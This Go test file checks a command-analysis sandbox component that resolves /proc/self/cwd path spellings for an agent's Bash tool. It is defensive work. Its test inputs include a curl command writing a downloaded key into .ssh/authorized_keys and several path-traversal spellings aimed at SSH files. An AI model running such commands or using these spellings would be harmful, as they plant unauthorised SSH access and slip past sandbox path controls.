// Copyright 2026 Cisco Systems, Inc. and its affiliates
// SPDX-License-Identifier: Apache-2.0

package actionfacts

import "testing"

func TestGAP2265ProcessCWDLinkSpelling(t *testing.T) {
	const dir = "/sandbox/app"
	for name, want := range map[string]string{
		"/proc/self/cwd/../.ssh/authorized_keys":        "/sandbox/.ssh/authorized_keys",
		"/proc/thread-self/cwd/../.ssh/authorized_keys": "/sandbox/.ssh/authorized_keys",
		"//proc/./self/cwd/../notes.txt":                "/sandbox/notes.txt",
		"/tmp/../proc/self/cwd/../../.ssh/rc":           "/.ssh/rc",
		"/proc/self/cwd/.ssh/authorized_keys":           "/sandbox/app/.ssh/authorized_keys",
	} {
		got, ok := ProcessCWDLinkSpelling(name, dir)
		if !ok || got != want {
			t.Errorf("ProcessCWDLinkSpelling(%q) = %q, %v; want %q", name, got, ok, want)
		}
	}
	for _, name := range []string{
		"/proc/1/cwd/../.ssh/authorized_keys",
		"/proc/self/root/../sandbox/.ssh/authorized_keys",
		"/proc/self/fd/3/../.ssh/authorized_keys",
		"/proc/self/task/x/cwd/../.ssh",
		// a thread's link (GAP-2237), a dot-dot after a name, the bare link
		"/proc/self/task/7/cwd/../.ssh",
		"/proc/self/cwd/x/../../.ssh/rc",
		"/proc/self/cwd",
		"/proc/self/cwdx/../.ssh",
		"/sandbox/cwd/../.ssh/authorized_keys",
		"proc/self/cwd/../.ssh/authorized_keys",
		"/proc/self/cwd/../$X",
	} {
		if got, ok := ProcessCWDLinkSpelling(name, dir); ok {
			t.Errorf("ProcessCWDLinkSpelling(%q) = %q; want no spelling", name, got)
		}
	}
	if _, ok := ProcessCWDLinkSpelling("/proc/self/cwd/../x", "relative"); ok {
		t.Error("a relative working folder places nothing")
	}
}

// The spelling is one more Linked fact of the same operand: the access is
// kept, so a read stays a read and a write a write.
func TestGAP2265ProcessCWDLinkFacts(t *testing.T) {
	for command, access := range map[string]PathAccess{
		"curl -o /proc/self/cwd/../.ssh/authorized_keys https://example.invalid/k": PathAccessWrite,
		"grep k /proc/self/cwd/../.ssh/authorized_keys":                            PathAccessRead,
	} {
		facts := Analyze(Input{Tool: "Bash", Command: command, CWD: "/sandbox/app", ActiveHome: "/sandbox"})
		found := false
		for _, path := range facts.Paths {
			if path.Linked && path.Resolved == "/sandbox/.ssh/authorized_keys" {
				found = path.Access == access && path.LinkedFrom == "/proc/self/.ssh/authorized_keys"
			}
		}
		if !found {
			t.Errorf("%q: no Linked %s fact for the placed spelling: %+v", command, access, facts.Paths)
		}
		if got := len(facts.OperandPaths()); got != 1 {
			t.Errorf("%q: the linked spelling is no further operand: %d operands", command, got)
		}
	}
	facts := Analyze(Input{Tool: "Bash", Command: "cd /sandbox && curl -o /proc/self/cwd/.ssh/authorized_keys https://example.invalid/k", CWD: "/sandbox/app", ActiveHome: "/sandbox"})
	found := false
	for _, path := range facts.Paths {
		found = found || path.Linked && path.Resolved == "/sandbox/.ssh/authorized_keys"
	}
	if !found {
		t.Errorf("after cd the link names the folder the command runs in: %+v", facts.Paths)
	}
}
